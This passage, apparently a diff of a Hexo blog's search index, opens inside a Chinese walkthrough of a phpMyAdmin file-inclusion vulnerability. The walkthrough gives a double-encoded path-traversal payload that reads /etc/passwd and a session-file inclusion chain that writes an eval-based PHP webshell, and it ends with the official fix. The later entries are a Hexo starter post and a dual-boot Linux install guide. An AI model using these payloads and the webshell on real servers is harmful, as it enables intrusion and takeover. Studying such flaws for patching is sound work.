class="code"><pre><span class="line">mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br></pre></td></tr></table></figure><p>用连接符将$page与<code>?</code>拼接，然后在其中查询<code>?</code>第一次出现的位置，这样一看可能有些奇怪，先带着这样的认知，再总体来看这一段code。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = mb_substr(</span><br><span class="line">        <span class="variable">$page</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>同样地，先要知道mb_substr不难看出，这是从$page中截取从位置0开始长度为mb_strpos($page . ‘?’, ‘?’)的一段字符串。而我们知道mb_strpos($page . ‘?’, ‘?’)所返回的是$page中第一个出现的<code>?</code>的位置，那么$_page最终所获取的是$page中再<code>?</code>前的所有字符。</p><p>继续往下，$_page同样被判断是否在白名单中，看到这里，应该我们可以知道这里其实是phpmyadmin的开发者考虑到target值在可能带有参数的情况下，也应该被正确的包含。所以对数据进行了清洗。</p><p>理解了这一边，后面其实做了类似的工作，只不过在此基础上将$page参数进行url解码再分割出<code>?</code>前的字符串判断是否包含在白名单内。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">   <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">       <span class="variable">$_page</span>,</span><br><span class="line">       <span class="number">0</span>,</span><br><span class="line">       mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">   );</span><br><span class="line">   <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>根据以上分析我们可以构造一个形如xxx.php?/../../../../../xxxx.php的payload传递给target参数。</p><p>第一个xxx.php应该是一个可以通过白名单验证的php文件，我们可以从之前$goto_whitelist对应的数组任意挑选一个，第二个xxxx.php则是我们意图包含的文件。</p><p>比如构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target&#x3D;sql.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>这里服务器会自动进行一次url解码，所以需要对?二次编码为%253f。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target&#x3D;sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="/blog/2019/08/27/FI20210127/MyBlog\source_posts\FI20210127\image-20210126222801037.png" alt="image-20210126222801037"></p><p>成功包含文件。</p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>phpmyadmin是默认会把执行的语句，记录在session文件当中的，所以可以利用包含session文件的方式来写入shell。</p><p>执行SQL语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php phpinfo();?&gt;&quot;</span><br></pre></td></tr></table></figure><img src="/blog/2019/08/27/FI20210127/MyBlog\source\_posts\FI20210127\image-20210127121016752.png" alt="image-20210127121016752"><p>PHP会序列化参数传递的值，并保存在本地的session文件中。查看当前phpmyadmin的cookie，并记录。</p><img src="/blog/2019/08/27/FI20210127/MyBlog\source\_posts\FI20210127\image-20210127121036800.png" alt="image-20210127121036800"><p>一般情况下，phpmyadmin的session文件会设置在/tmp目录下。</p><p>（如linux下默认存储在/var/lib/php/session目录）</p><p>进入dokcer容器，查看<code>tmp</code>路径下的session文件。</p><p><img src="/blog/2019/08/27/FI20210127/MyBlog\source_posts\FI20210127\image-20210127122045919.png" alt="image-20210127122045919"></p><p>把该session文件包含进去</p><p>构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target&#x3D;sql.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;sess_6f1f4267c65de394d87398d6ef54d893</span><br></pre></td></tr></table></figure><p><img src="/blog/2019/08/27/FI20210127/MyBlog\source_posts\FI20210127\image-20210127122521211.png" alt="image-20210127122521211"></p><p>我们可以看到phpinfo被解析出现。如果要继续写入webshell，从phpinfo中搜索web路径，查找<code>CONTEXT_DOCUMENT_ROOT</code>这一栏目</p><p><img src="/blog/2019/08/27/FI20210127/MyBlog\source_posts\FI20210127\image-20210127122921062.png" alt="image-20210127122921062"></p><p>可以看到路径为/var/www/html，构造sql语句写入webshell，如这里利用php的file_put_contents函数将一个字符串写入文件中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php file_put_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;webshell.php&#39;,&#39;&lt;?php eval($_POST[a]);?&gt;&#39;);?&gt;&quot;</span><br></pre></td></tr></table></figure><p><img src="/blog/2019/08/27/FI20210127/MyBlog\source_posts\FI20210127\image-20210127123450942.png" alt="image-20210127123450942"></p><p>再次包含session文件。</p><p>访问webshell.php文件，发现文件存在，说明写入成功。</p><p><img src="/blog/2019/08/27/FI20210127/MyBlog\source_posts\FI20210127\image-20210127123830334.png" alt="image-20210127123830334"></p><p>蚁剑连接。</p><p><img src="/blog/2019/08/27/FI20210127/MyBlog\source_posts\FI20210127\image-20210127133755420.png" alt="image-20210127133755420"></p><img src="/blog/2019/08/27/FI20210127/MyBlog\source\_posts\FI20210127\image-20210127133823598.png" alt="image-20210127133823598" style="zoom:80%;"><p>成功Getshell。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>参考官方的漏洞修复</p><p><img src="/blog/2019/08/27/FI20210127/Users\Lkio\AppData\Roaming\Typora\typora-user-images\image-20210127152016552.png" alt="image-20210127152016552"></p><p><img src="/blog/2019/08/27/FI20210127/MyBlog\source_posts\FI20210127\image-20210127152109259.png" alt="image-20210127152109259"></p><p>添加了一个include参数，当$include=true时,仅执行第一次判断$page的合法性，构造的payload将不会进入到urldecode的环节。</p>]]></content>
-      
-      
+      <tags>
+        <tag>PHP</tag>
+        <tag>WEB</tag>
+        <tag>Mysql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/blog/2019/06/10/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>双系统 Win10下安装Linux（单/双硬盘）</title>
+    <url>/blog/2021/01/20/%E5%8F%8C%E7%B3%BB%E7%BB%9F%20Win10%E4%B8%8B%E5%AE%89%E8%A3%85Linux%EF%BC%88%E5%8D%95_%E5%8F%8C%E7%A1%AC%E7%9B%98%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="单硬盘"><a href="#单硬盘" class="headerlink" title="单硬盘"></a>单硬盘</h1><p>出于一些学习需要，笔者需要安装双系统。典型的<strong>Windows+Linux</strong>的双系统组合。<br>这里笔者在Win10环境下安装Linux系统。<br>采用了Centos和Ubuntu两种Linux系统发行版本。<br>分别尝试了 种机型<br><code>Acer-Aspire V15、MI Pro、HP 暗影精灵II、Lenovo IDEALPad等</code></p>
+<a id="more"></a>
+
+<h2 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h2><p>准备<kbd>Centos7 iso镜像</kbd>.<br>官网：<br><a href="https://www.centos.org/download/">https://www.centos.org/download/</a><br>阿里源：<br><a href="http://mirrors.aliyun.com/centos/7/isos/x86_64/">http://mirrors.aliyun.com/centos/7/isos/x86_64/ </a><br>首先，准备一个U盘作为系统引导。<br>可以利用UltraISO(<a href="https://ultraiso.en.softonic.com/">https://ultraiso.en.softonic.com/</a>)工具制作引导盘。<br>使用方法：<br><img src="https://img-blog.csdnimg.cn/2019091214021332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="Alt"><br>点击继续试用;<br><img src="https://img-blog.csdnimg.cn/20190912140445964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>选中文件，打开镜像所在目录，选中镜像;<br><img src="https://img-blog.csdnimg.cn/20190912142702178.png#pic_center" alt="在这里插入图片描述"><br>然后点击启动项，选择写入硬盘映像。其余默认即可。<br><code>Tip:U盘数据会被清空！</code><br>安装前需要进行的准备工作，详见下文Ubuntu中。<br>这边主要针对可能会出现的==invalid pointer==错误提示，提出解决方案。<br>因为路径识别的问题，完整的Centos镜像文件名与U盘名不匹配（这边没有进行深入探究，似乎U盘名称长度受限，一般只能显示到x8处）<br><strong>解决方案</strong>：<br>    <img src="https://img-blog.csdnimg.cn/20190912141901615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center=40x40" alt="在这里插入图片描述">由于当时没有拍照，图源自他处，选择在Install Centos项，按下e。<br>将<code>“linuxefi /images/pxeboot/vmlinuz inst.stage2=hd:LABEL=CentOS\x207\x20x86_64 quiet”</code><br>改为<br><code> linuxefi /images/pxeboot/vmlinuz inst.stage2=hd:LABEL=CentOS\x207\x20x8 quiet</code><br>否则将安装失败。</p>
+<h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><p>安装过程中分别尝试了<kbd>Ubuntu 14.04</kbd> 与 <kbd>Ubuntu 18.04</kbd><br>这边推荐新手安装较高的版本的Ubuntu（原因见下文），但一般出于稳定性的考虑不会使用最新版本，可以使用笔者采用的18.04版本。</p>
+<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>准备镜像资源<br>官方：<a href="https://ubuntu.com/download">https://ubuntu.com/download</a><br>阿里源：<a href="http://mirrors.aliyun.com/ubuntu-releases/">http://mirrors.aliyun.com/ubuntu-releases</a><br>1.制作U盘引导<br>见上文<code>Centos</code>；</p>
+<p>2.划出安装区<br><img src="https://img-blog.csdnimg.cn/20190912151609516.png#pic_center" alt="在这里插入图片描述"><br>鼠标右击“此电脑”，选中管理；<br><img src="https://img-blog.csdnimg.cn/2019091215173668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>打开磁盘管理，点击想要进行划分的磁盘；<br><img src="https://img-blog.csdnimg.cn/20190912152027325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>压缩卷；<br><img src="https://img-blog.csdnimg.cn/20190912152130603.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>确保磁盘未使用空间足够的情况下，填入期望划分出的空闲区的大小，笔者划分了80G；<br><img src="https://img-blog.csdnimg.cn/20190912152232924.png#pic_center" alt="在这里插入图片描述"><br>最后会显示一个黑色区域，不要进行建卷操作，我们需要的是一个无格式的分区。</p>
+<p>3.关闭快速启动<br><img src="https://img-blog.csdnimg.cn/20190912144600275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>打开”电源和睡眠设置“；</p>
+<p><img src="https://img-blog.csdnimg.cn/20190912144647264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center=50x50" alt="在这里插入图片描述"><br>选择“其他电源设置”；<br><img src="https://img-blog.csdnimg.cn/20190912144738365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>点击“选择电源按钮的功能”；<br><img src="https://img-blog.csdnimg.cn/2019091214490156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击==更改当前不可用的设置==，勾去==启用快速启动==；</p>
+<p>4.确认UEFI模式</p>
+<blockquote>
+<p>UEFI引导的流程是开机初始化UEFI，然后，直接引导操作系统，进入系统。和传统的BIOS引导相比，UEFI引导少了一道BIOS自检的过程。</p>
+</blockquote>
+<p>见下图，Boot-&gt;Boot Mode</p>
+<p>5.关闭Secure Boot。<br>Secure Boot<br>即安全启动项。</p>
+<blockquote>
+<p>Secure BOOT设计之初作用是防止恶意软件侵入。事实上它能够做到的仅仅是，当电脑引导器被病毒修改之后，它会给出提醒并拒绝启动，避免可能带来的进一步损失。</p>
+</blockquote>
+<p>如果将安全启动项开始，系统会默认引导Windows系统，其他系统系统将无法启动。<br>方法：<br>1.进入BIOS界面（一般是F2或者Fn + F2）；<br>2.选择BOOT项，找到Secure Boot 将其改为 disabled。<br><img src="https://img-blog.csdnimg.cn/20190912145318544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>6.改变引导优先级<br>见上图，选中USB设备将其放置最上方。（即改变value，一般在bios的下方会有介绍，通常是F6）。<br>到这里准备工作基本完毕。</p>
+<h3 id="正式安装Ubuntu系统"><a href="#正式安装Ubuntu系统" class="headerlink" title="正式安装Ubuntu系统"></a>正式安装Ubuntu系统</h3><p><strong>关于分区</strong>：<br>(50G为例)<br>/boot    逻辑分区        400MB（400MB足够，可通用）；<br>/            主分区            20000MB；<br>swap    逻辑分区        8000MB(参照主机内存，一般不超过，笔者是8G内存)；<br>/home    逻辑分区        剩余所有空间，可以放置个人文档、数据。</p>
+<p>由于图片拍摄不便，po百度百科和其他博主图片。<br>图片取自：Windows + Ubuntu 16.04 双系统安装详细教程<br> 链接：<a href="https://blog.csdn.net/flyyufenfei/article/details/79187656">https://blog.csdn.net/flyyufenfei/article/details/79187656</a>（如有侵权，会立即删除，告谢）<br><img src="https://img-blog.csdnimg.cn/20190912150518350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190912150639447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>ubuntu18的界面与这有些不同，但操作类似。<br><img src="https://img-blog.csdnimg.cn/20190912150753225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这边可以两个都不用勾选。<br><img src="https://img-blog.csdnimg.cn/20190912150836287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一般会提示你已经安装Windows系统或其他系统，一定注意选择==其他选项==，选择默认项将会导致格盘，造成已安装系统丢失。<br><img src="https://img-blog.csdnimg.cn/20190912151022494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>找到之前划出的空闲区，采取分区方案分区。<br>要注意的是，==安装启动引导的设备要选择/boot分区对应的标号==。<br>这边不做赘述。</p>
+<h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p>笔者分别对六台不同型号的笔记本进行了双系统安装；<br>这里分享一些可能遇到的问题以及解决方案；</p>
+<p><strong>a.安装完Ubuntu后，重启直接进入Windos系统</strong></p>
+<p><strong>解决方案：</strong></p>
+<p>重新启动，进入BIOS界面，在启动优先级处将Ubuntu系统放置在第一位，这样可以进入Ubuntu系统；<br>或者，在Windos系统下引导菜单；<br><img src="https://img-blog.csdnimg.cn/20190912153328303.png#pic_center" alt="在这里插入图片描述"><br>打开“此电脑”属性；<br><img src="https://img-blog.csdnimg.cn/20190912153413295.png#pic_center" alt="在这里插入图片描述"><br>点击“高级系统设置”；<br><img src="https://img-blog.csdnimg.cn/2019091215350315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>设置“启动和故障恢复”，点击“设置”；<br><img src="https://img-blog.csdnimg.cn/20190912153556974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>勾选“显示操作系统列表的时间”，默认30s即可；<br>这样重启后，会发现出现系统引导菜单，可以进行系统选择；</p>
+<p><strong>b.BIOS下找不到Ubuntu系统</strong></p>
+<p><strong>解决方案：</strong></p>
+<p>重启，进入BooT Menu（一般为F12），查看是否有Ubuntu系统引导；</p>
+<p><strong>c.Ubuntu14 无线网卡问题</strong></p>
+<p><strong>解决方案:</strong></p>
+<p>这就是上文推荐安装Ubuntu18的原因了，在Ubuntu14种无线网卡驱动存在问题，需要先进行有线连接更新驱动，但对于小米用户（出于轻便设计考虑，去掉了宽带口）似乎不可行，但在Ubuntu18上无线网卡驱动是正常的，可以像Windows端一样轻松搜索Wifi。</p>
+<p><strong>d.Ubuntu /boot引导问题</strong></p>
+<p><strong>解决方案：</strong></p>
+<p>我在为朋友的一台较新的笔记本安装双系统时，对空闲区进行分区，采用/boot引导会提示不可行，这时候需要采用efi格式，即将”ext4…”一栏下拉，选择efi即可，引导分区选择efi分区对应标号。</p>
+<p><strong>e. Ubuntu 引导无法被识别</strong></p>
+<p><strong>解决方案:</strong></p>
+<p>这是笔者在安装过程中碰到最困惑的一个问题，笔记本是较老的型号预留有光驱位（放盘），尝试了各种姿势安装Ubuntu14都无法找到引导；<br>经过一系列尝试，终于找到了一个能进入Ubuntu的姿势；<br>首先需要将固态盘放置在笔记本内，而不是光驱位，让BIOS能读取到固态硬盘。因为这样的笔记本在BIOS中只会读取到一个磁盘，即放置在内部的（很奇怪）；<br>将Ubuntu18（Ubuntu14无用）系统装在固态盘即系统盘上，这时候还是无法找到引导；<br>利用工具easyBCD添加引导grub2，自动加载即可，按照上文打开引导列表，重启会发现一个Linux系统引导，Enter进入，会提示“请插入Windows光盘…”这是正常的，这时候按下Escape（Esc）,会发现显示一个固态盘的分区界面（Boot Option Menu）。<br><img src="https://img-blog.csdnimg.cn/20190912161440852.png#pic_center" alt="在这里插入图片描述"><br>因为我们只安装了两个系统，并且都在固态盘上，显然这个不知名设备正是我们的Ubuntu系统，选择进入，成功进入Ubuntu。</p>
+<h1 id="双硬盘"><a href="#双硬盘" class="headerlink" title="双硬盘"></a>双硬盘</h1><p>双硬盘安装即固械混合安装系统，是将Ubuntu系统的引导分区\boot存放在固态硬盘（系统盘C盘），其他分区放置在机械硬盘（数据盘）。<br>所以，操作与单硬盘基本类似，不同在于，我们需要在系统盘上划出400MB以上的空闲区作为引导分区。<br>可参考：<br><a href="https://blog.csdn.net/m0_37857300/article/details/78930773">https://blog.csdn.net/m0_37857300/article/details/78930773</a></p>
+]]></content>
       <categories>
-          
-          <category> Web安全 </category>
-          
+        <category>杂记</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> Web </tag>
-            
-            <tag> PhpMyadmin </tag>
-            
-            <tag> PHP </tag>
-            
-            <tag> CVE </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Hello World</title>
-      <link href="/blog/2019/06/10/hello-world/"/>
-      <url>/blog/2019/06/10/hello-world/</url>
-      
-        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-  
-  
+  </entry>
 </search>
